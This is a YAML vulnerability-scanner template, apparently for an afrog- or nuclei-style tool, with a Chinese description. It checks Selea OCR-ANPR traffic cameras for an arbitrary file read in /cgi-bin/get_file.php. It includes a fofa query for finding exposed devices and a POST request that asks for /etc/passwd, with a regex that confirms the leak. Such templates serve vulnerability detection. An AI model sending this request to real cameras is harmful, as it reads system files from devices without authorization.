id: selea-targa-camera-fileread

info:
  name: Selea OCR-ANPR摄像机 get_file.php 任意文件读取漏洞
  author: zan8in
  severity: high
  verified: false
  description: |
    Selea OCR-ANPR摄像机 get_file.php存在 任意文件读取漏洞，通过构造特殊请求获取服务器文件
    fofa: app="Selea-ANPR-Camera"
  tags: selea,targa,camera,fileread,unauthorized
  created: 2023/05/26

rules:
  r0:
    request:
      method: POST
      path: /cgi-bin/get_file.php
      body: |
        name=test&files_list=/etc/passwd
      follow_redirects: true
    expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
expression: r0()
